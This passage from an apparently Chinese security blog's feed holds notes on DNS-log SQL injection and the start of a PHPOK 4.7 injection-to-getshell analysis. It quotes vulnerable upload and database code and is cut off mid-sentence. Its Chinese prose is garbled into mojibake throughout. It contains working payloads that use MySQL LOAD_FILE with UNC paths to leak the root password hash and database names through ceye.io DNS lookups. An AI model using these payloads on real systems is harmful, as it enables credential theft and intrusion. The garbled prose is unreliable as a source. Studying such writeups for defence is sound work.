href="#dnsä½¿ç”¨å‡½æ•°è§£æï¼š" class="headerlink" title="dnsä½¿ç”¨å‡½æ•°è§£æï¼š"></a>dnsä½¿ç”¨å‡½æ•°è§£æï¼š</h2><ul><li><strong>load_file:</strong></li></ul><p>è¿™æ˜¯ä¸€ä¸ªç”¨æ¥è¯»å–æ–‡ä»¶çš„å‡½æ•°ï¼ˆå¿…é¡»æ˜¯rootæƒé™ï¼‰ï¼Œè¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶<strong>å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Š</strong>ï¼Œå¿…é¡»<strong>æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶</strong>ï¼Œè€Œä¸”<strong>å¿…é¡»æœ‰FILEæƒé™</strong>ã€‚ è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetx(é™åˆ¶serveræ¥æ”¶æ•°æ®åŒ…å¤§å°å‡½æ•°ï¼Œé»˜è®¤æ˜¯1MB)ã€‚<br>å¦‚æœ<strong>è¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚</strong><br>åœ¨MySQL5.0.19ï¼Œcharacter_set_filesystemç³»ç»Ÿå˜é‡æ§åˆ¶æ–‡ä»¶åçš„è§£é‡Šï¼Œå³ä»…ä½œæ–‡å­—å­—ç¬¦ä¸²ã€‚</p><hr><p><a href="http://ceye.ioæ˜¯ä¸€ä¸ªå…è´¹çš„dnslogå¹³å°ï¼Œï¼ˆé‡Œé¢æä¾›äº†å¦‚ä½•æ“ä½œå’Œæ³¨å…¥paylodï¼‰" target="_blank" rel="noopener">http://ceye.ioæ˜¯ä¸€ä¸ªå…è´¹çš„dnslogå¹³å°ï¼Œï¼ˆé‡Œé¢æä¾›äº†å¦‚ä½•æ“ä½œå’Œæ³¨å…¥paylodï¼‰</a></p><p>å¹³å°æ‰€ç»™å‡ºçš„payloadï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.yluzfg.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œä¹‹å:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\root.yluzfg.ceye.io\abc&apos;)</span><br></pre></td></tr></table></figure><p>concatå…¶å®æˆ‘ä»¬å·²ç»äº†è§£è¿‡äº†ï¼Œé€šè¿‡ä»–æ¥æ‹¼æ¥å­—ç¬¦ä¸²ã€‚<br>è€Œå‰é¢çš„\å°†åé¢çš„\è½¬ä¹‰äº†ï¼Œæ‰€ä»¥åªå‰©ä¸‹ä¸¤ä¸ªâ€™\â€™</p><p>è€Œ\å¼€å¤´åŠ ä¸Šç½‘ç»œè·¯å¾„æ­£å¥½å½¢æˆäº†ä¸€ä¸ªuncè·¯å¾„ï¼Œè¿™ç§ä¹Ÿå«UNCè·¯å¾„è®¿é—®æ³•<br>é€šè¿‡å‘½ä»¤å»è®¿é—®ç½‘ä¸Šé‚»å±…ã€‚</p><p>å®é™…ä¸Šè¿™å¥è¯­å¥æ˜¯æ•°æ®åº“æ‰§è¡Œå»è®¿é—®root.yluzfg.ceye.ioçš„å…±äº«æ–‡ä»¶å¤¹abcï¼Œè€Œceye.ioçš„å­åŸŸåè§£æéƒ½æ˜¯åœ¨æŸäº›æœåŠ¡å™¨ï¼Œç„¶åè®°å½•äº†æœ‰äººè¯·æ±‚è®¿é—®äº†root.yluzfg.ceye.ioï¼Œç„¶åé€šè¿‡æ—¥å¿—åœ¨ceyeè¿™ä¸ªå¹³å°ä¸Šé¢æ˜¾ç¤ºå‡ºæ¥äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ payloadsæ¥é€šè¿‡dnsè§£æäº§ç”Ÿçš„è®°å½•æ—¥å¿—å¹¶ä¼ åˆ°yece.ioæŸ¥è¯¢æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;)))#</span><br></pre></td></tr></table></figure><p>åœ¨é€šè¿‡ceyeå»æŸ¥çœ‹æˆ‘ä»¬æ‰€çˆ†å‡ºçš„ä¿¡æ¯ï¼›<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/jP2FMP6IcA.s0t78L8v1AAEErEAqFFyX3mGTVvy9g8Y!/b/dL4AAAAAAAAA&amp;bo=lAOBAAAAAAADBzQ!&amp;rf=viewer_4" alt></p><p>å°±è¿™æ ·ï¼Œé€šè¿‡ä¸€æ­¥æ­¥çˆ†å‡ºæ•°æ®åº“ã€è¡¨ã€å­—æ®µç­‰å…³é”®ä¿¡æ¯ï¼Œå¯¹äºæœ‰å¤šä¸ªå€¼ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç§»åŠ¨åç§»å»ä¸€ä¸ªä¸ªæŸ¥çœ‹ï¼›</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPOK 4.7ä»æ³¨å…¥åˆ°getshell</title>
      <link href="/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/"/>
      <url>/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>phpokæ˜¯ä¸€æ¬¾PHPå¼€å‘çš„å¼€æºä¼ä¸šç½‘ç«™ç³»ç»Ÿã€‚<br>åœ¨phpok 4.7ç‰ˆæœ¬åŠä»¥å‰ï¼Œå­˜åœ¨ä¸€ä¸ªç”±æ³¨å…¥å¯¼è‡´çš„å‰å°getshellæ¼æ´ã€‚<br>ç›®å‰å®˜æ–¹æœ€æ–°ç‰ˆå·²ç»ä¿®è¡¥ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨/framework/www/upload_control.phpä¸­ç¬¬61è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private function upload_base($input_name=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;å›¾ç‰‡å­˜å‚¨å¤±è´¥&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $rs[&quot;status&quot;] = &quot;ok&quot;;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å‡½æ•°ï¼Œç„¶ååœ¨è¯¥å‡½æ•°å¼€å¤´åˆè°ƒç”¨äº†getfileå‡½æ•°ï¼Œè·Ÿè¿›:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function getfile($input=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$input)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;æœªæŒ‡å®šè¡¨å•åç§°&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_cate($cateid);</span><br><span class="line">        if(isset($_FILES[$input]))&#123;</span><br><span class="line">            $rs = $this-&gt;_upload($input);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $rs = $this-&gt;_save($input);</span><br><span class="line">        &#125;</span><br><span class="line">        if($rs[&apos;status&apos;] != &apos;ok&apos;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $rs[&apos;cate&apos;] = $this-&gt;cate;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨ä¸Šä¼ æ–‡ä»¶å°±è°ƒç”¨_uploadå‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">private function _upload($input)</span><br><span class="line">    &#123;</span><br><span class="line">        global $app;</span><br><span class="line">        $basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">        $chunk = $app-&gt;get(&apos;chunk&apos;,&apos;int&apos;);</span><br><span class="line">        $chunks = $app-&gt;get(&apos;chunks&apos;,&apos;int&apos;);</span><br><span class="line">        if(!$chunks)&#123;</span><br><span class="line">            $chunks = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = $_FILES[$input][&quot;name&quot;];</span><br><span class="line">        $tmpid = &apos;u_&apos;.md5($tmpname);</span><br><span class="line">        $ext = $this-&gt;file_ext($tmpname);</span><br><span class="line">        $out_tmpfile = $this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$chunk;</span><br><span class="line">        if (!$out = @fopen($out_tmpfile.&quot;.parttmp&quot;, &quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;æ— æ³•æ‰“å¼€è¾“å‡ºæµ&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $error_id = $_FILES[$input][&apos;error&apos;] ? $_FILES[$input][&apos;error&apos;] : 0;</span><br><span class="line">        if($error_id)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;$this-&gt;up_error[$error_id]);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!is_uploaded_file($_FILES[$input][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;ä¸Šä¼ å¤±è´¥ï¼Œä¸´æ—¶æ–‡ä»¶æ— æ³•å†™å…¥&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$in = @fopen($_FILES[$input][&quot;tmp_name&quot;], &quot;rb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;æ— æ³•æ‰“å¼€è¾“å…¥æµ&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">            fwrite($out, $buff);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        @fclose($in);</span><br><span class="line">        $app-&gt;lib(&apos;file&apos;)-&gt;mv($out_tmpfile.&apos;.parttmp&apos;,$out_tmpfile.&apos;.part&apos;);</span><br><span class="line">        $index = 0;</span><br><span class="line">        $done = true;</span><br><span class="line">        for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">            if (!file_exists($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&quot;.part&quot;) ) &#123;</span><br><span class="line">                $done = false;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$done)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;&apos;ä¸Šä¼ çš„æ–‡ä»¶å¼‚å¸¸&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        $outfile = $this-&gt;folder.$basename.&apos;.&apos;.$ext;</span><br><span class="line">        if(!$out = @fopen($this-&gt;dir_root.$outfile,&quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;æ— æ³•æ‰“å¼€è¾“å‡ºæµ&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(flock($out,LOCK_EX))&#123;</span><br><span class="line">            for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">                if (!$in = @fopen($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&apos;.part&apos;,&apos;rb&apos;))&#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">                    fwrite($out, $buff);</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose($in);</span><br><span class="line">                $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&quot;_&quot;.$index.&quot;.part&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            flock($out,LOCK_UN);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        $tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<strong>$ext = $this-&gt;file_ext($tmpname);</strong>æ˜¯æ£€æµ‹æ–‡ä»¶åç¼€çš„ï¼Œçœ‹ä¸€ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private function file_ext($tmpname)</span><br><span class="line">    &#123;</span><br><span class="line">        $ext = pathinfo($tmpname,PATHINFO_EXTENSION);</span><br><span class="line">        if(!$ext)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = strtolower($ext);</span><br><span class="line">        $filetypes = &quot;jpg,gif,png&quot;;</span><br><span class="line">        if($this-&gt;cate &amp;&amp; $this-&gt;cate[&apos;filetypes&apos;])&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;cate[&apos;filetypes&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;file_type)&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;file_type;</span><br><span class="line">        &#125;</span><br><span class="line">        $list = explode(&quot;,&quot;,$filetypes);</span><br><span class="line">        $list = array_unique($list);</span><br><span class="line">        if(!in_array($ext,$list))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return $ext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ˜¯æ¯”è¾ƒä¸¥æ ¼çš„ï¼Œåªå…è®¸ä¸Šä¼ åç¼€æ˜¯jpg,png,gifè¿™ç§å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œä¸Šä¼ æˆ‘ä»¬æ— æ³•ç»•è¿‡ï¼Œä½†æ˜¯ç¨‹åºå¯¹äºä¸Šä¼ çš„æ–‡ä»¶åæ²¡æœ‰å……ä»½çš„è¿‡æ»¤ï¼Œåœ¨å‡½æ•°æœ«å°¾ï¼Œå°†æ–‡ä»¶åæ·»åŠ åˆ°äº†è¿”å›çš„æ•°ç»„ä¸­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„$tmpnameå°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åï¼Œæ³¨æ„ï¼Œä¸æ˜¯ä¸Šä¼ åçš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸Šä¼ å‰çš„æ–‡ä»¶åï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹è¯¥æ–‡ä»¶åè¿‡æ»¤ï¼Œç„¶åè¿”å›ã€‚</p><p>æˆ‘ä»¬å›åˆ°å¼€å¤´ï¼Œupload_baseå‡½æ•°ä¸­å»:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°†è¿”å›å€¼ä¸­çš„titleçš„å€¼èµ‹å€¼ç»™äº†$array[â€˜titleâ€™],è¿™ä¸ªå€¼æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œç„¶åå°†$arrayå¸¦å…¥åˆ°äº†saveå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¯¥å‡½æ•°:</p><p>åœ¨/framework/model/res.phpä¸­ç¬¬279è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function save($data,$id=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            return $this-&gt;db-&gt;update_array($data,&quot;res&quot;,array(&quot;id&quot;=&gt;$id));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $this-&gt;db-&gt;insert_array($data,&quot;res&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°†$dataå¸¦å…¥åˆ°äº†insert_arrayå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¯¥å‡½æ•°:</p><p>/framework/engine/db/mysqli.phpä¸­ç¬¬211è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data,$tbl,$type=&quot;insert&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$tbl || !$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($tbl,0,strlen($this-&gt;prefix)) != $this-&gt;prefix)&#123;</span><br><span class="line">            $tbl = $this-&gt;prefix.$tbl;</span><br><span class="line">        &#125;</span><br><span class="line">        $type = strtolower($type);</span><br><span class="line">        $sql = $type == &apos;insert&apos; ? &quot;INSERT&quot; : &quot;REPLACE&quot;;</span><br><span class="line">        $sql.= &quot; INTO &quot;.$tbl.&quot; &quot;;</span><br><span class="line">        $sql_fields = array();</span><br><span class="line">        $sql_val = array();</span><br><span class="line">        foreach($data AS $key=&gt;$value)&#123;</span><br><span class="line">            $sql_fields[] = &quot;`&quot;.$key.&quot;`&quot;;</span><br><span class="line">            $sql_val[] = &quot;&apos;&quot;.$value.&quot;&apos;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $sql.= &quot;(&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">        return $this-&gt;insert($sql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å°†è¯¥æ•°ç»„ä¸­çš„é”®å€¼éå†å‡ºæ¥ï¼Œå°†é”®ä½œä¸ºå­—æ®µåï¼Œå°†å€¼ä½œä¸ºå¯¹åº”å­—æ®µçš„å€¼ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºå€¼æ˜¯æ²¡æœ‰è¿›è¡Œè½¬ä¹‰çš„ï¼Œå…¶ä¸­åŒ…æ‹¬æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„titleçš„å€¼ï¼Œé‚£ä¹ˆè¿™é‡Œå°±äº§ç”Ÿäº†ä¸€ä¸ªinsertçš„æ³¨å…¥ã€‚é‚£ä¹ˆè¿™ä¸ªæ³¨å…¥æˆ‘ä»¬æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå½“ç„¶é¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸€ä¸ªå‡ºæ•°æ®ï¼Œä½†æ˜¯å¯¹äºupdate 